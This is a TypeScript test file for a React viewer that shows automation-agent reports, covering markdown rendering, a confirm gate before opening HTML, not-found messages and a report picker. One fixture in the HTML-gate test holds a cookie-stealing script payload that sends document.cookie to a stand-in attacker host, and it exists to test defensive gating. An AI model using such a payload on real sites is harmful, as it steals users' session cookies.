import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'

import { renderToStaticMarkup } from 'react-dom/server'

import {
  ReportPathPicker,
  ReportViewBody,
  isHtmlReport,
  loadReportContent,
  type ReportFilesystem,
  type ReportViewState,
} from './AutomationReportViewer'

let failures = 0
const pending: Array<Promise<void>> = []
function run(name: string, fn: () => void | Promise<void>): void {
  pending.push(
    Promise.resolve()
      .then(fn)
      .then(
        () => console.log(`ok - ${name}`),
        (error) => {
          failures += 1
          console.error(`not ok - ${name}`)
          console.error(error)
        },
      ),
  )
}

const WORKSPACE = '/repo'

// A recording stub for the two filesystem calls the viewer makes. Each call is
// logged so a test can assert both the path resolution and that the wrong
// branch was never taken (e.g. an html report must not read inline).
function stubFs(overrides: Partial<ReportFilesystem> = {}): {
  fs: ReportFilesystem
  reads: string[]
  opens: string[]
} {
  const reads: string[] = []
  const opens: string[] = []
  const fs: ReportFilesystem = {
    readfile: async (path) => {
      reads.push(path)
      throw new Error('not stubbed')
    },
    openHtmlFileInBrowser: async (path) => {
      opens.push(path)
    },
    ...overrides,
  }
  return { fs, reads, opens }
}

// ---- loadReportContent: the read/open branches (stubbed filesystem) ---------

run('a .md report reads <workspaceRoot>/<path> and renders as markdown', async () => {
  const { fs, reads, opens } = stubFs({
    readfile: async (path) => {
      reads.push(path)
      return '# Findings\n\nAll clear.'
    },
  })
  const state = await loadReportContent(fs, WORKSPACE, 'reports/run-1.md')
  assert.deepEqual(reads, ['/repo/reports/run-1.md'], 'reads the path resolved under the workspace root')
  assert.equal(opens.length, 0, 'a markdown report never opens the browser')
  assert.equal(state.kind, 'markdown')
  assert.equal(state.kind === 'markdown' && state.markdown, '# Findings\n\nAll clear.')
})

run('a readfile rejection (missing/un-merged file) yields the not-found state', async () => {
  const { fs } = stubFs({
    readfile: async () => {
      throw new Error('ENOENT')
    },
  })
  const state = await loadReportContent(fs, WORKSPACE, 'reports/missing.md')
  assert.equal(state.kind, 'not-found')
})

run('an existing .html report probes the path and resolves to the confirm gate without opening', async () => {
  const { fs, reads, opens } = stubFs({
    readfile: async (path) => {
      reads.push(path)
      return "<script>fetch('//attacker/'+document.cookie)</script>"
    },
  })
  const state = await loadReportContent(fs, WORKSPACE, 'reports/run-1.html')
  assert.deepEqual(reads, ['/repo/reports/run-1.html'], 'probes the resolved path for existence')
  assert.equal(opens.length, 0, 'loading an html report never opens the browser — opening is gated behind confirm')
  assert.equal(state.kind, 'html-confirm')
})

run('an un-merged .html report (existence probe rejects) reaches not-found, never a false opened state', async () => {
  const { fs, opens } = stubFs({
    readfile: async () => {
      throw new Error('ENOENT')
    },
  })
  const state = await loadReportContent(fs, WORKSPACE, 'reports/run-1.html')
  assert.equal(state.kind, 'not-found')
  assert.equal(opens.length, 0, 'an un-merged html report is never handed to the browser')
})

run('isHtmlReport distinguishes .html from .md (case-insensitive)', () => {
  assert.equal(isHtmlReport('reports/a.html'), true)
  assert.equal(isHtmlReport('reports/a.HTML'), true)
  assert.equal(isHtmlReport('reports/a.md'), false)
})

// ---- ReportViewBody: each terminal state renders correctly ------------------

function body(state: ReportViewState, pullRequestUrl?: string): string {
  return renderToStaticMarkup(
    <ReportViewBody state={state} pullRequestUrl={pullRequestUrl} onOpenHtml={() => {}} />,
  )
}

run('the markdown state renders the report content via renderMarkdown', () => {
  const markup = body({ kind: 'markdown', markdown: '# Security findings\n\nNo issues.' })
  assert.match(markup, /markdown-rendered/, 'content goes through the shared markdown renderer')
  assert.match(markup, /Security findings/, 'the heading text renders')
  assert.match(markup, /No issues\./, 'the body text renders')
})

run('the not-found state shows the merge message and the Pull request link when present', () => {
  const markup = body({ kind: 'not-found' }, 'https://github.com/o/r/pull/7')
  assert.match(markup, /hasn’t been merged yet/, 'the not-found copy is shown')
  assert.match(markup, /href="https:\/\/github\.com\/o\/r\/pull\/7"/, 'the PR link points at the run PR')
  assert.match(markup, /Pull request/, 'the link is labelled')
})

run('the not-found state without a PR names the real cause, not an imaginary merge', () => {
  // No PR means nothing to merge: the path came from the agent's prose summary,
  // so the file simply is not here. Claiming "not merged yet" would send the user
  // looking for a pull request that does not exist.
  const markup = body({ kind: 'not-found' })
  assert.match(markup, /isn’t in your workspace/, 'the copy names the actual state')
  assert.ok(!markup.includes('merged'), 'no merge claim without a pull request')
  assert.ok(!markup.includes('<a '), 'no anchor without a pullRequestUrl')
})

run('the html-confirm gate warns it can run code and offers an explicit Open anyway, not inline content', () => {
  const markup = body({ kind: 'html-confirm' })
  assert.match(markup, /can run code/, 'the run-code risk is stated before opening')
  assert.match(markup, /automation agent/, 'ownership of the html is attributed to the agent')
  assert.match(markup, /Open anyway/, 'opening is an explicit confirmation, not the default')
  assert.ok(!markup.includes('markdown-rendered'), 'html is never inline-rendered as markdown')
})

run('the html-opened state reports the browser hand-off and offers Open again', () => {
  const markup = body({ kind: 'html-opened' })
  assert.match(markup, /opened in your browser/, 'the html hand-off is explained')
  assert.match(markup, /Open again/, 'a re-open affordance is offered')
  assert.ok(!markup.includes('markdown-rendered'), 'html is never inline-rendered as markdown')
})

run('the loading state shows a labelled spinner', () => {
  const markup = body({ kind: 'loading' })
  assert.match(markup, /Loading report/, 'the loading state is labelled')
})

// ---- ReportPathPicker: multi-report switching -------------------------------

// The picker is the kit `Select`, not a `SegmentedControl`: `paths` is unbounded
// (a run can write any number of reports) and the segmented control is a
// no-wrap `inline-flex` ruled for 2–4 short labels, so a six-report run pushed
// it out of a side pane that scrolls only vertically. The Select trigger names
// the active report and truncates in place; the popup carries the list.
run('the picker names the active report and offers every report as a choice', () => {
  const markup = renderToStaticMarkup(
    <ReportPathPicker
      paths={['reports/a.md', 'reports/b.html']}
      activePath="reports/a.md"
      onSelect={() => {}}
    />,
  )
  assert.match(markup, /role="combobox"[^>]*aria-label="Reports"/, 'a single-choice control named for AT')
  assert.match(markup, />a\.md</, 'the trigger reads the active report’s basename')
  assert.match(markup, />reports\/a\.md</, 'the active report’s full path reads as a visible provenance line')
  assert.doesNotMatch(markup, /title="reports\//, 'never a native title tooltip')

  const tree = ReportPathPicker({
    paths: ['reports/a.md', 'reports/b.html'],
    activePath: 'reports/a.md',
    onSelect: () => {},
  })
  const control = (tree.props.children as Array<{ props: Record<string, unknown> }>)
    .filter(Boolean)
    .find((child) => typeof child.props.onChange === 'function')
  assert.ok(control, 'the picker renders the select')
  assert.deepEqual(
    control!.props.items,
    [
      { value: 'reports/a.md', label: 'a.md' },
      { value: 'reports/b.html', label: 'b.html' },
    ],
    'every report is a choice, listed by basename',
  )
  assert.equal(control!.props.value, 'reports/a.md', 'and the active report is the selected value')
})

run('a run with many reports still fits the side pane: no no-wrap segmented row', () => {
  const markup = renderToStaticMarkup(
    <ReportPathPicker
      paths={['reports/a.md', 'reports/b.md', 'reports/c.md', 'reports/d.md', 'reports/e.md', 'reports/f.md']}
      activePath="reports/a.md"
      onSelect={() => {}}
    />,
  )
  assert.doesNotMatch(markup, /role="radiogroup"/, 'six reports are not six segments in a row that cannot wrap')
  // One trigger, whatever the count — the list lives in the popup.
  assert.equal((markup.match(/role="combobox"/g) ?? []).length, 1, 'exactly one control')
  assert.doesNotMatch(markup, />f\.md</, 'the sixth basename is not painted inline beside the first five')
})

run('picking a report reports its path upward', () => {
  let picked: string | null = null
  // Drive the change handler directly off the element tree the picker builds:
  // `onChange` is the one seam a pick travels through, whether it came from a
  // click, an arrow key, Home/End, or type-ahead.
  const tree = ReportPathPicker({
    paths: ['reports/a.md', 'reports/b.html'],
    activePath: 'reports/a.md',
    onSelect: (path) => {
      picked = path
    },
  })
  const control = (tree.props.children as Array<{ props: { onChange?: (path: string) => void } }>)
    .filter(Boolean)
    .find((child) => typeof child.props.onChange === 'function')
  assert.ok(control, 'the picker renders the select')
  control!.props.onChange!('reports/b.html')
  assert.equal(picked, 'reports/b.html', 'choosing the second report reports its path upward')
})

// ---- Component wiring the static render cannot reach ------------------------
// The pane's effect + dismissal are lifecycle-bound (the load effect and the
// focus-on-open Escape handler only run once mounted), so assert them against
// the source the same way the Backlog row tests assert panel wiring.
const viewerSource = readFileSync(
  join(process.cwd(), 'src/renderer/src/components/automations/AutomationReportViewer.tsx'),
  'utf8',
)

run('the active report loads through loadReportContent in an effect keyed on the selection', () => {
  assert.match(
    viewerSource,
    /useEffect\(\(\) => \{[\s\S]*loadReportContent\(window\.api, workspaceRoot, activePath\)[\s\S]*\}, \[activePath, workspaceRoot\]\)/,
    'the load runs in an effect re-keyed on activePath, so picking a report loads it',
  )
})

run('the picker selection is wired to setActivePath', () => {
  assert.match(
    viewerSource,
    /<ReportPathPicker[^>]*onSelect=\{setActivePath\}/,
    'choosing a report updates the active selection that the effect reloads on',
  )
})

run('opening an html report is wired only through the confirm action, never the load effect', () => {
  // The load effect must not open the browser (F1): openHtmlFileInBrowser is
  // called solely from the openHtml confirm handler, which the body invokes via
  // onOpenHtml. Assert the effect body holds no open call and the handler does.
  const effect = viewerSource.match(/useEffect\(\(\) => \{[\s\S]*?\}, \[activePath, workspaceRoot\]\)/)
  assert.ok(effect, 'the load effect exists')
  assert.ok(
    !effect![0].includes('openHtmlFileInBrowser'),
    'the load effect never opens the browser — a single View-report click does not run agent html',
  )
  assert.match(
    viewerSource,
    /const openHtml = useCallback\(\(\) => \{[\s\S]*?openHtmlFileInBrowser\(joinFilePath\(workspaceRoot, activePath\)\)/,
    'the only open call lives in the explicit openHtml confirm handler',
  )
  assert.match(
    viewerSource,
    /<ReportViewBody[^>]*onOpenHtml=\{openHtml\}/,
    'the confirm gate and re-open both route through the gated openHtml handler',
  )
})

run('the report renders as a closable SidePane body, not a full-window overlay', () => {
  assert.ok(
    !viewerSource.includes('<Drawer'),
    'no Drawer overlay — the report opens beside the list, like the Backlog detail pane',
  )
  assert.match(
    viewerSource,
    /<SidePaneHeader title=\{title\} onClose=\{onClose\} closeLabel="Close report"/,
    'the header hosts the close affordance via SidePaneHeader',
  )
})

run('Escape closes the pane, scoped to the pane so it does not also clear the list selection', () => {
  // The keydown lives on the focusable pane wrapper (not window), and the pane
  // focuses itself on open, so Escape resolves here instead of falling through
  // to the definition list's own Escape handler behind it.
  assert.match(
    viewerSource,
    /onKeyDown=\{\(event\) => \{\s*if \(event\.key === 'Escape'\) onClose\(\)/,
    'Escape on the pane wrapper closes the report',
  )
  assert.match(
    viewerSource,
    /paneRef\.current\?\.focus\(\)/,
    'the pane focuses itself on open so its Escape handler is the one that fires',
  )
})

void Promise.all(pending).then(() => {
  if (failures > 0) {
    console.error(`AutomationReportViewer.test.tsx: ${failures} failing`)
    process.exit(1)
  }
  console.log('AutomationReportViewer.test.tsx: ok')
})
